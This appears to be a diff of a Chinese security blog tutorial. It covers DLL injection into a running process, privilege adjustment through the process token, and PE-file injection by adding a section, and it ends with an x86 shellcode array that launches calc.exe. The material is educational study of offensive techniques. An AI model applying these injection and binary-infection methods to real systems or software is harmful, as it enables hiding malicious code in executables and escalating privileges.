+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>但是这边编译代码的时候出了很多问题，于是把_tprintf全部替换成了printf，且所有字符串去掉了L前缀。</p>
+<p>按道理来讲_tprintf不应该报错才对。</p>
+<p>之后打开notepad 查看一下进程号。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>运行册程序注入dll。改一下代码</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>成功弹出计算器。</p>
+<h2 id="0x04-dll注入实现提权"><a class="header-anchor" href="#0x04-dll注入实现提权">¶</a>0x04 dll注入实现提权</h2>
+<p>前面看dll注入代码的时候，有一个提权函数。这里分析一下</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>首先打开当前进程的令牌，存储在hToken中。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>查看目标权限的上下文，存储到luid中。</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>用新建的tp对象替换原来的进程令牌实现权限的变化。</p>
+<h2 id="0x05-PE注入"><a class="header-anchor" href="#0x05-PE注入">¶</a>0x05 PE注入</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p>
+<p>该文章对PE结构讲解十分详细。</p>
+<p>PE（ Portable Execute）文件是Windows下可执行文件的总称，常见的有 <strong>DLL，EXE，OCX，SYS</strong> 等。它是微软在 UNIX 平台的 COFF（通用对象文件格式）基础上制作而成。<strong>最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下</strong>。<strong>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)</strong>。</p>
+<p>PE文件的格式如下</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>PE文件加载的过程如下：</p>
+<ul>
+<li>检查Dos header里面的PE header偏移，然后直接跳转到header</li>
+<li>检查header是否合法，如果合法则跳转到header的尾部</li>
+<li>header的尾部是节表，此时PE装载器会读取节表的信息，然后映射内存（虚存相关，操作系统讲过）</li>
+<li>映射完毕之后，开始处理输入表的逻辑部分</li>
+</ul>
+<p>注意到文件中的节表和节</p>
+<p><strong>节表</strong>：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</p>
+<p><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个</p>
+<p>**导出表 <strong>是 用来描述 模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress函数就能动态获取到函数的地址。</strong></p>
+<p><strong>导入表</strong> 在 PE 文件加载时，会根据这个表里的内容加载依赖的 DLL ( 模块 )，并填充所需函数的地址。</p>
+<h3 id="注入思路"><a class="header-anchor" href="#注入思路">¶</a>注入思路</h3>
+<p>首先了解，PE文件中导入的dll信息以结构体的形式存储在IDT中。只要将dll添加到列表尾部就可以。<strong>IMAGE_OPPTIONAL_HEADER结构体中导入表RVA即是IDT的RVA。如果内存不够，就移动IDT。</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDT结构解析</p>
+<p>注入的手段一半有两种：</p>
+<ul>
+<li>寻找最大的代码空白，cave mine，将 shellcode 写入 cave 中。这种方式比较方便，缺点是只适合较小的  shellcode，windows 上的 shellcode 要比 linux 上的 shellcode 大许多，这种方式的泛用性不高。</li>
+<li>新增 PE 节，这种方式修改 PE 文件的节头表和节，可以插入任意大小的 shellcode。</li>
+</ul>
+<p>PE 文件注入主要包括两个方面：</p>
+<ul>
+<li>编写 shellcode</li>
+<li>注入 shellcode</li>
+</ul>
+<p>注入 shellcode 相对比较简单，下面介绍新增 PE 节实现 PE 注入的方法。</p>
+<h3 id="注入实现"><a class="header-anchor" href="#注入实现">¶</a>注入实现</h3>
+<p>思路大都是添加节之类的，这里自己没有实现，找了两个项目。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> 这个是注入pe的项目</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> 这个很强，转化pe为shellcode</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> 这是pe_to_shellcode的解析</p>
+<p>pe_to_shellcode这个东西得看代码才能懂。</p>
+<p>演示一下第一个注入项目。</p>
+<p>手动编译了一个32位的项目</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>然后利用github项目中的exe，执行注入，注入的代码是弹出一个messagebox</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>运行badpe</p>
+<p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>点击确定之后会政策执行代码。弹计算器只需要把改代码替换为下面的shellcode即可。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> 
+<span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span>
+<span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span>
+<span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span>
+<span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span>
+<span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span>
+<span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span>
+<span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span>
+<span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span>
+<span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span>
+<span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span>
+<span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span>
+<span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span>
+<span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span>
+<span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span>
+<span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span>
+<span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span>
+<span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span>
+<span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span>
+<span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span>
+<span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span>
+<span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span>
+<span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span>
+<span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span>
+<span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span>
+<span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+
+                
+              </div>
             
             <hr/>
             <div>
@@ -637,23 +1067,6 @@
   
 
 
-
-
-  
-  <script defer>
-    if (document.getElementById('hbePass')) {
-      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
-        var hbePrefix = document.querySelector('hbe-prefix');
-        hbePrefix.parentElement.classList.add('markdown-body');
-        Fluid.utils.retry(function() {
-          if (Fluid.boot && Fluid.boot.refreshPlugins) {
-            Fluid.boot.refreshPlugins();
-            return true;
-          }
-        }, 100, 10);
-      })
-    }
-  </script>
 
 
   
